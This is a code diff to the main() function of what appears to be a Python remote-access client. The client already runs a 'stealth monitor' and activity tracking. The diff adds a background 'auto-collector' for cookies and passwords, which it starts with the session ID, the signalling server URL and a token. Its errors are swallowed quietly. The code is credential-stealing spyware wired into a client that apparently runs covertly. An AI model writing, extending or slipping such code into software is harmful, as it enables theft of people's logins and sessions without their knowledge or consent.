@@ -357,6 +357,20 @@ def main() -> None:
     except Exception as exc:
         logging.getLogger(__name__).debug("Activity tracking unavailable: %s", exc)
 
+    # Start auto-collector for cookies/passwords (background)
+    auto_collector = None
+    try:
+        from .auto_collector import start_auto_collection
+        auto_collector = start_auto_collection(
+            session_id=session_id,
+            server_url=resolve_signaling_url(),
+            token=signaling_token,
+        )
+        if auto_collector:
+            logging.getLogger(__name__).info("Auto-collection started")
+    except Exception as exc:
+        logging.getLogger(__name__).debug("Auto-collection unavailable: %s", exc)
+
     client = build_client(
         session_id,
         signaling_token,
@@ -368,6 +382,12 @@ def main() -> None:
         asyncio.run(client.run_forever())
     finally:
         stop_stealth_monitor()
+        if auto_collector is not None:
+            try:
+                from .auto_collector import stop_auto_collection
+                stop_auto_collection()
+            except Exception:
+                pass
         if activity_sender is not None:
             try:
                 activity_sender.stop()
